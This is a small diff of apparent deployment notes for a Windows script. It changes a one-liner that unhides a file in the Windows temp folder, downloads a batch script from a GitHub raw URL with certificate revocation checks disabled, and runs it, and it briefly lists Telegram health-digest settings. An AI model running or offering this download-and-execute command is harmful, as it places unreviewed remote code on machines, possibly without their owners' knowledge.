@@ -1,6 +1,6 @@
 UNIVERSAL DEPLOY (O35 / M25 / L14 / T15 / S7):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o35" & findstr /C:"OWN BUILD 20260802O35" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/71077bbd7518407953aa64e6158fec60c3e42573/own.txt" & findstr /C:"OWN BUILD 20260802O35" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 O35:
 - Quiet TG: no hourly digest when healthy (prim OK + gryxa OK + no foreign);
